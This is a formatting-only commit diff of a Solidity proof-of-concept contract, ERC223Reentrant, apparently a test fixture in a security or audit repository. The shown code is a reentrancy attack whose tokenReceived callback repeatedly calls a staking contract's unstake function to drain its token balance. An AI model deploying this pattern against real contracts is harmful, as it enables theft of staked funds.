prettier 2nd poc

+++ contracts/malicious/ERC223Reentrant.sol
@@ -7,6 +7,7 @@ import "../interfaces/IERC223.sol";
 
 interface IStaking {
     function balanceOf(address user) external returns (uint256);
+
     function unstake(uint256 amount) external;
 }
 
@@ -15,7 +16,7 @@ contract ERC223Reentrant is IERC223Recipient {
     IStaking public vulnContract;
     uint256 public depositedFunds;
 
-    constructor(address _token,address _vulnContract) {
+    constructor(address _token, address _vulnContract) {
         token = IERC223(_token);
         vulnContract = IStaking(_vulnContract);
     }
@@ -24,23 +25,30 @@ contract ERC223Reentrant is IERC223Recipient {
 
     function enter(uint256 _amount) public {
         depositedFunds = vulnContract.balanceOf(address(this)) + _amount;
-        token.transfer(address(vulnContract),_amount);
-        require(vulnContract.balanceOf(address(this)) == depositedFunds,"ERC223Reentrant: Something wrong with deposits");
+        token.transfer(address(vulnContract), _amount);
+        require(
+            vulnContract.balanceOf(address(this)) == depositedFunds,
+            "ERC223Reentrant: Something wrong with deposits"
+        );
     }
 
     function exit() public {
         uint256 balBefore = vulnContract.balanceOf(address(this));
         vulnContract.unstake(balBefore);
     }
-    
-    function tokenReceived(address _from, uint _value, bytes memory _data) public override {
-        require(msg.sender == address(token),"ERC223Reentrant: Allow call from the ERC223 token");
-        if (_data.length > 4) {  
+
+    function tokenReceived(
+        address _from,
+        uint256 _value,
+        bytes memory _data
+    ) public override {
+        require(msg.sender == address(token), "ERC223Reentrant: Allow call from the ERC223 token");
+        if (_data.length > 4) {
             string memory check = abi.decode(_data, (string));
             return;
         }
         uint256 entireBal = token.balanceOf(address(vulnContract));
-        if ( entireBal > 0 ) {
+        if (entireBal > 0) {
             vulnContract.unstake(depositedFunds);
         }
     }
